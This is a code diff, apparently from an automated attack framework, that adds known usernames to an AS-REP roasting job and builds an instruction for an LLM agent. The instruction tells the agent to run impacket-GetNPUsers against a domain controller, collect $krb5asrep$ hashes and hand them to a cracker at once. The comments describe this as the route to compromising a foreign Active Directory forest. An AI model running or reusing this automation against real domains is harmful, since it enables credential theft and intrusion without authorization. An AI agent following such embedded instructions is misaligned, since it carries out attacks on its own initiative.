@@ -101,17 +101,57 @@ pub async fn auto_credential_access(
         };
 
         for (domain, dc_ip) in asrep_work {
-            let excluded_users = dispatcher
-                .state
-                .read()
-                .await
-                .quarantined_principals_in_domain(&domain);
-            let payload = json!({
+            let (excluded_users, known_users) = {
+                let state = dispatcher.state.read().await;
+                let excluded = state.quarantined_principals_in_domain(&domain);
+                // Pull every username already discovered for this domain. AS-REP
+                // roasting needs a userlist to probe — `kerberos_user_enum_noauth`
+                // works on some DCs but is denied on hardened targets where
+                // anonymous SAMR returns STATUS_LOGON_FAILURE. Without a baked-in
+                // list the LLM has nothing to roast and the dispatch is wasted.
+                // We collect users from `state.users` (populated by initial enum
+                // + cross-forest LDAP-via-ticket), filter out the ones that aren't
+                // real principals (computer accounts ending in `$`), and pass
+                // them as `known_users` so the agent can immediately run
+                // `GetNPUsers -no-pass -usersfile <list>`. This is the load-
+                // bearing path for compromising a SID-filtered foreign forest
+                // via AS-REP — without it, the cross-forest LDAP enumeration's
+                // payoff (discovered usernames) never gets consumed by the
+                // AS-REP automation, and the chain stalls at the step right
+                // before a roastable account's hash would be captured.
+                let dom_l = domain.to_lowercase();
+                let mut users: Vec<String> = state
+                    .users
+                    .iter()
+                    .filter(|u| u.domain.to_lowercase() == dom_l)
+                    .filter(|u| !u.username.is_empty() && !u.username.ends_with('$'))
+                    .map(|u| u.username.clone())
+                    .collect();
+                users.sort();
+                users.dedup();
+                (excluded, users)
+            };
+            let mut payload = json!({
                 "techniques": ["kerberos_user_enum_noauth", "asrep_roast", "username_as_password"],
                 "target_ip": dc_ip,
                 "domain": domain,
                 "excluded_users": excluded_users.join(","),
             });
+            if !known_users.is_empty() {
+                payload["known_users"] = json!(known_users);
+                payload["instructions"] = json!(format!(
+                    "{} usernames already discovered for {}. Run \
+                     `impacket-GetNPUsers -no-pass -dc-ip {} {}/ -usersfile <(echo \
+                     \"$known_users\")` and harvest any $krb5asrep$ hashes; \
+                     prioritise this over `kerberos_user_enum_noauth` (some \
+                     DCs deny anonymous SAMR). Hand any roastable hash to the \
+                     cracker tool immediately.",
+                    known_users.len(),
+                    domain,
+                    dc_ip,
+                    domain,
+                ));
+            }
 
             let priority = dispatcher.effective_priority("asrep_roast");
             match dispatcher
